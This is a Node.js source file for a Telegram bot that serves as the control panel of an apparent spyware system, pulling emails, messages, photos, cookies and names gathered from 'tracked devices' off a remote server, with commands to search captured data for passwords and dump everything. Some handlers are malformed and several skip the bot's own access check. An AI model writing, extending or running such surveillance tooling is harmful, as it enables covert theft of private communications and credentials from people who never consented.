const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

// ğŸ” SECURITY: Replace with YOUR Telegram Chat ID (get from @userinfobot)
const AUTHORIZED_CHAT_ID = process.env.YOUR_CHAT_ID || 'YOUR_CHAT_ID_HERE';
const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const NUPI_API = process.env.NUPI_API || 'https://nupidesktopai.com';

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

console.log('ğŸ¤– NUPI Data Recall Bot started...');
console.log(`ğŸ” Authorized Chat ID: ${AUTHORIZED_CHAT_ID}`);

// ğŸ›¡ï¸ SECURITY CHECK - Only you can use this bot
function isAuthorized(chatId) {
    return chatId.toString() === AUTHORIZED_CHAT_ID.toString();
}

// Middleware to check authorization
function checkAuth(msg, callback) {
    if (!isAuthorized(msg.chat.id)) {
        bot.sendMessage(msg.chat.id, 'ğŸš« Unauthorized access. This bot is private.');
        console.log(`âŒ Unauthorized access attempt from: ${msg.chat.id}`);
        return;
    }
    callback();
}

// /start command
bot.onText(/\/start/, (msg) => {
    checkAuth(msg, () => {
        const chatId = msg.chat.id;
        bot.sendMessage(chatId, `
ğŸ¤– *NUPI Cloud Agent - Your Private Data Recall Bot*

ğŸ” Authorized Access Confirmed

*Available Commands:*
ğŸ“§ /emails [deviceId] - Get all collected emails
ğŸ’¬ /messages [deviceId] - Get all collected messages
ğŸ–¼ï¸ /photos [deviceId] - Get all collected photos
ğŸ” /search <query> - Search all collected data
ğŸ“Š /latest [deviceId] - Get latest collected data
ğŸ¯ /stream - Real-time data stream (last 10)
ğŸ†” /devices - List all tracked devices
ğŸ‘¥ /users - List all detected user names
ğŸ‘¤ /user [name] - Get all data for specific user
ğŸ“ˆ /stats - Overall system statistics
ğŸš¨ /all - Get EVERYTHING (use with caution)

*Examples:*
\`/emails abc123\`
\`/search password\`
\`/latest abc123\`
\`/user John Smith\`
\`/stream\`
        `, { parse_mode: 'Markdown' });
    });
});

// /emails command - Recall all emails
bot.onText(/\/emails(?:\s+(.+))?/, async (msg, match) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        const deviceId = match[1];
        
        if (!deviceId) {
            bot.sendMessage(chatId, 'âŒ Please provide a device ID\nUsage: /emails <deviceId>');
            return;
        }
        
        try {
            bot.sendMessage(chatId, 'ğŸ“§ Searching for emails...');
            
            const response = await axios.post(`${NUPI_API}/api/user-data/search`, {
                query: '',
                deviceId,
                type: 'email'
            });
            
            if (response.data.count === 0) {
                bot.sendMessage(chatId, 'ğŸ“­ No emails found for this device.');
                return;
            }
            
            let message = `ğŸ“§ *Found ${response.data.count} Emails*\n\n`;
            
            response.data.results.slice(0, 10).forEach((result, i) => {
                message += `*Email ${i + 1}:*\n`;
                message += `Source: ${result.data.source}\n`;
                message += `Data: ${result.data.data.substring(0, 200)}...\n`;
                message += `Collected: ${new Date(result.collected).toLocaleString()}\n\n`;
            });
            
            if (response.data.count > 10) {
                message += `\n_Showing 10 of ${response.data.count} emails_`;
            }
            
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            
        } catch (error) {
            bot.sendMessage(chatId, `âŒ Error: ${error.message}`);
        }
    });
});

// /messages command - Recall all messages
bot.onText(/\/messages(?:\s+(.+))?/, async (msg, match) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        const deviceId = match[1];
        
        if (!deviceId) {
            bot.sendMessage(chatId, 'âŒ Please provide a device ID\nUsage: /messages <deviceId>');
            return;
        }
        
        try {
        bot.sendMessage(chatId, 'ğŸ’¬ Searching for messages...');
        
        const response = await axios.post(`${NUPI_API}/api/user-data/search`, {
            query: '',
            deviceId,
            type: 'message'
        });
        
        if (response.data.count === 0) {
            bot.sendMessage(chatId, 'ğŸ’¬ No messages found for this device.');
            return;
        }
        
        let message = `ğŸ’¬ *Found ${response.data.count} Messages*\n\n`;
        
        response.data.results.slice(0, 10).forEach((result, i) => {
            message += `*Message ${i + 1}:*\n`;
            message += `Source: ${result.data.source}\n`;
            message += `Data: ${result.data.data.substring(0, 200)}...\n`;
            message += `Collected: ${new Date(result.collected).toLocaleString()}\n\n`;
        });
        
        if (response.data.count > 10) {
            message += `\n_Showing 10 of ${response.data.count} messages_`;
        }
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        
    } catch (error) {
        bot.sendMessage(chatId, `âŒ Error: ${error.message}`);
    }
});

// /photos command - Recall all photos
bot.onText(/\/photos(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    
    if (!deviceId) {
        bot.sendMessage(chatId, 'âŒ Please provide a device ID\nUsage: /photos <deviceId>');
        return;
    }
    
    try {
        bot.sendMessage(chatId, 'ğŸ–¼ï¸ Searching for photos...');
        
        const response = await axios.post(`${NUPI_API}/api/user-data/search`, {
            query: '',
            deviceId,
            type: 'photo'
        });
        
        if (response.data.count === 0) {
            bot.sendMessage(chatId, 'ğŸ–¼ï¸ No photos found for this device.');
            return;
        }
        
        let message = `ğŸ–¼ï¸ *Found ${response.data.count} Photos*\n\n`;
        
        response.data.results.slice(0, 5).forEach((result, i) => {
            message += `*Photo ${i + 1}:*\n`;
            message += `URL: ${result.data.url}\n`;
            message += `Alt: ${result.data.alt}\n`;
            message += `Source Page: ${result.data.source}\n`;
            message += `Collected: ${new Date(result.collected).toLocaleString()}\n\n`;
        });
        
        if (response.data.count > 5) {
            message += `\n_Showing 5 of ${response.data.count} photos_`;
        }
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        
        // Send actual photo URLs
        response.data.results.slice(0, 3).forEach(result => {
            try {
                bot.sendPhoto(chatId, result.data.url).catch(() => {});
            } catch (e) {}
        });
        
    } catch (error) {
        bot.sendMessage(chatId, `âŒ Error: ${error.message}`);
    }
});

// /search command - Search all collected data
bot.onText(/\/search (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const query = match[1];
    
    try {
        bot.sendMessage(chatId, `ğŸ” Searching for: "${query}"...`);
        
        const response = await axios.post(`${NUPI_API}/api/user-data/search`, {
            query
        });
        
        if (response.data.count === 0) {
            bot.sendMessage(chatId, 'âŒ No results found.');
            return;
        }
        
        let message = `ğŸ” *Search Results for "${query}"*\n`;
        message += `Found ${response.data.count} matches\n\n`;
        
        response.data.results.slice(0, 5).forEach((result, i) => {
            message += `*Result ${i + 1}:*\n`;
            message += `Type: ${result.type}\n`;
            message += `Device: ${result.deviceId.substring(0, 20)}...\n`;
            message += `Data: ${JSON.stringify(result.data).substring(0, 150)}...\n`;
            message += `Collected: ${new Date(result.collected).toLocaleString()}\n\n`;
        });
        
        if (response.data.count > 5) {
            message += `\n_Showing 5 of ${response.data.count} results_`;
        }
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        
    } catch (error) {
        bot.sendMessage(chatId, `âŒ Error: ${error.message}`);
    }
});

// /latest command - Get latest data
bot.onText(/\/latest(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    
    if (!deviceId) {
        bot.sendMessage(chatId, 'âŒ Please provide a device ID\nUsage: /latest <deviceId>');
        return;
    }
    
    try {
        bot.sendMessage(chatId, 'ğŸ“Š Fetching latest data...');
        
        const response = await axios.get(`${NUPI_API}/api/user-data/latest/${deviceId}`);
        
        if (!response.data.data) {
            bot.sendMessage(chatId, 'ğŸ“­ No data collected yet for this device.');
            return;
        }
        
        const data = response.data.data;
        let message = `ğŸ“Š *Latest Data from Device*\n\n`;
        message += `Device ID: ${data.deviceId.substring(0, 30)}...\n`;
        message += `Collected: ${new Date(data.collected).toLocaleString()}\n\n`;
        message += `ğŸ“§ Emails: ${data.emails.length}\n`;
        message += `ğŸ’¬ Messages: ${data.messages.length}\n`;
        message += `ğŸ–¼ï¸ Photos: ${data.photos.length}\n`;
        message += `ğŸª Cookies: ${data.cookies.length}\n\n`;
        
        if (data.emails.length > 0) {
            message += `*Recent Email:*\n${JSON.stringify(data.emails[0]).substring(0, 200)}...\n\n`;
        }
        
        if (data.messages.length > 0) {
            message += `*Recent Message:*\n${JSON.stringify(data.messages[0]).substring(0, 200)}...\n`;
        }
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        
    } catch (error) {
        bot.sendMessage(chatId, `âŒ Error: ${error.message}`);
    }
});

// ğŸ¯ REAL-TIME STREAM - See latest collections
bot.onText(/\/stream/, (msg) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        
        try {
            bot.sendMessage(chatId, 'ğŸ“¡ Fetching real-time stream...');
            
            const response = await axios.get(`${NUPI_API}/api/user-data/stream?limit=10`);
            
            if (response.data.count === 0) {
                bot.sendMessage(chatId, 'ğŸ“­ No data collected yet.');
                return;
            }
            
            let message = `ğŸ“¡ *Real-Time Data Stream*\n`;
            message += `Last ${response.data.count} collections:\n\n`;
            
            response.data.stream.forEach((item, i) => {
                message += `*${i + 1}. ${new Date(item.timestamp).toLocaleString()}*\n`;
                if (item.userName) message += `ğŸ‘¤ User: ${item.userName}\n`;
                message += `Device: ${item.deviceId.substring(0, 20)}...\n`;
                message += `ğŸ“§ ${item.emails.length} | ğŸ’¬ ${item.messages.length} | ğŸ–¼ï¸ ${item.photos.length}\n\n`;
            });
            
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            
        } catch (error) {
            bot.sendMessage(chatId, `âŒ Error: ${error.message}`);
        }
    });
});

// ğŸ“ˆ STATS - System statistics
bot.onText(/\/stats/, (msg) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        
        try {
            const response = await axios.get(`${NUPI_API}/api/user-data/stats`);
            const stats = response.data.stats;
            
            let message = `ğŸ“ˆ *NUPI Cloud Agent Statistics*\n\n`;
            message += `ğŸ“Š Total Records: ${stats.totalRecords}\n`;
            message += `ğŸ–¥ï¸ Total Devices: ${stats.totalDevices}\n`;
            message += `ğŸ‘¥ Total Users: ${stats.totalUsers}\n\n`;
            message += `ğŸ“§ Total Emails: ${stats.totalEmails}\n`;
            message += `ğŸ’¬ Total Messages: ${stats.totalMessages}\n`;
            message += `ğŸ–¼ï¸ Total Photos: ${stats.totalPhotos}\n\n`;
            if (stats.lastCollection) {
                message += `â±ï¸ Last Collection: ${new Date(stats.lastCollection).toLocaleString()}`;
            }
            
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            
        } catch (error) {
            bot.sendMessage(chatId, `âŒ Error: ${error.message}`);
        }
    });
});

// ğŸ†” DEVICES - List all devices
bot.onText(/\/devices/, (msg) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        
        try {
            bot.sendMessage(chatId, 'ğŸ–¥ï¸ Fetching all devices...');
            
            const response = await axios.get(`${NUPI_API}/api/user-data/devices`);
            
            if (response.data.count === 0) {
                bot.sendMessage(chatId, 'ğŸ“­ No devices tracked yet.');
                return;
            }
            
            let message = `ğŸ–¥ï¸ *All Tracked Devices (${response.data.count})*\n\n`;
            
            response.data.devices.slice(0, 20).forEach((device, i) => {
                message += `*Device ${i + 1}:*\n`;
                if (device.userName) message += `ğŸ‘¤ User: ${device.userName}\n`;
                message += `ID: ${device.deviceId.substring(0, 30)}...\n`;
                message += `Collections: ${device.totalCollections}\n`;
                message += `First Seen: ${new Date(device.firstSeen).toLocaleString()}\n`;
                message += `Last Seen: ${new Date(device.lastSeen).toLocaleString()}\n\n`;
            });
            
            if (response.data.count > 20) {
                message += `\n_Showing 20 of ${response.data.count} devices_`;
            }
            
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            
        } catch (error) {
            bot.sendMessage(chatId, `âŒ Error: ${error.message}`);
        }
    });
});

// ğŸ‘¥ USERS - List all detected users
bot.onText(/\/users/, (msg) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        
        try {
            bot.sendMessage(chatId, 'ï¿½ Fetching all users...');
            
            const response = await axios.get(`${NUPI_API}/api/user-data/users`);
            
            if (response.data.count === 0) {
                bot.sendMessage(chatId, 'ğŸ“­ No users detected yet.');
                return;
            }
            
            let message = `ğŸ‘¥ *All Detected Users (${response.data.count})*\n\n`;
            
            response.data.users.forEach((user, i) => {
                message += `*${i + 1}. ${user.name}*\n`;
                message += `Devices: ${user.devices.length}\n`;
                message += `Total Data: ${user.totalData} collections\n`;
                message += `First Seen: ${new Date(user.firstSeen).toLocaleString()}\n\n`;
            });
            
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            
        } catch (error) {
            bot.sendMessage(chatId, `âŒ Error: ${error.message}`);
        }
    });
});

// ğŸ‘¤ USER - Get all data for specific user
bot.onText(/\/user (.+)/, (msg, match) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        const userName = match[1];
        
        try {
            bot.sendMessage(chatId, `ğŸ‘¤ Fetching data for: ${userName}...`);
            
            const response = await axios.get(`${NUPI_API}/api/user-data/user/${encodeURIComponent(userName)}`);
            
            if (!response.data.user) {
                bot.sendMessage(chatId, 'âŒ User not found in database.');
                return;
            }
            
            const user = response.data.user;
            let message = `ğŸ‘¤ *User Data: ${user.name}*\n\n`;
            message += `ğŸ–¥ï¸ Devices: ${user.devices.length}\n`;
            message += `ğŸ“Š Total Collections: ${user.totalData}\n`;
            message += `â±ï¸ First Seen: ${new Date(user.firstSeen).toLocaleString()}\n\n`;
            
            message += `*Recent Collections:*\n`;
            user.recentCollections.slice(0, 5).forEach((col, i) => {
                message += `${i + 1}. ${new Date(col.timestamp).toLocaleString()}\n`;
                message += `   ğŸ“§ ${col.emails.length} | ğŸ’¬ ${col.messages.length} | ğŸ–¼ï¸ ${col.photos.length}\n`;
            });
            
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            
            // Send detailed device info
            if (user.devices.length > 0) {
                let deviceMsg = `*Devices for ${user.name}:*\n\n`;
                user.devices.forEach((device, i) => {
                    deviceMsg += `${i + 1}. ${device.deviceId.substring(0, 30)}...\n`;
                    deviceMsg += `   Collections: ${device.totalCollections}\n`;
                });
                bot.sendMessage(chatId, deviceMsg, { parse_mode: 'Markdown' });
            }
            
        } catch (error) {
            bot.sendMessage(chatId, `âŒ Error: ${error.message}`);
        }
    });
});

// ğŸš¨ ALL - Get EVERYTHING (emergency access)
bot.onText(/\/all/, (msg) => {
    checkAuth(msg, async () => {
        const chatId = msg.chat.id;
        
        bot.sendMessage(chatId, 'ğŸš¨ *EMERGENCY ACCESS ACTIVATED*\n\nFetching ALL data from NUPI Cloud...', { parse_mode: 'Markdown' });
        
        try {
            // Get stats first
            const statsRes = await axios.get(`${NUPI_API}/api/user-data/stats`);
            const stats = statsRes.data.stats;
            
            let message = `ğŸš¨ *COMPLETE DATA DUMP*\n\n`;
            message += `ğŸ“Š Records: ${stats.totalRecords}\n`;
            message += `ğŸ–¥ï¸ Devices: ${stats.totalDevices}\n`;
            message += `ğŸ‘¥ Users: ${stats.totalUsers}\n`;
            message += `ğŸ“§ Emails: ${stats.totalEmails}\n`;
            message += `ğŸ’¬ Messages: ${stats.totalMessages}\n`;
            message += `ğŸ–¼ï¸ Photos: ${stats.totalPhotos}\n\n`;
            
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            
            // Get all devices
            const devicesRes = await axios.get(`${NUPI_API}/api/user-data/devices`);
            
            bot.sendMessage(chatId, `ğŸ“± Sending data for ${devicesRes.data.count} devices...`);
            
            for (const device of devicesRes.data.devices.slice(0, 10)) {
                let deviceMsg = `*Device: ${device.deviceId.substring(0, 30)}...*\n`;
                if (device.userName) deviceMsg += `ğŸ‘¤ ${device.userName}\n`;
                deviceMsg += `Collections: ${device.totalCollections}\n`;
                deviceMsg += `Use: \`/latest ${device.deviceId}\` for details`;
                
                bot.sendMessage(chatId, deviceMsg, { parse_mode: 'Markdown' });
                
                // Wait 500ms between messages to avoid rate limiting
                await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            bot.sendMessage(chatId, 'âœ… Data dump complete!');
            
        } catch (error) {
            bot.sendMessage(chatId, `âŒ Error: ${error.message}`);
        }
    });
});

// Handle all other messages
bot.on('message', (msg) => {
    // Only respond if not a command
    if (!msg.text || msg.text.startsWith('/')) return;
    
    if (!isAuthorized(msg.chat.id)) {
        bot.sendMessage(msg.chat.id, 'ğŸš« Unauthorized. This is a private bot.');
        return;
    }
    
    bot.sendMessage(msg.chat.id, 
        'ğŸ’¡ Use /start to see available commands or /search to find data.'
    );
});

console.log('âœ… Telegram recall bot is running!');
console.log('ğŸ“± Only authorized user can access data');
console.log(`ğŸ” Your Chat ID: ${AUTHORIZED_CHAT_ID}`);
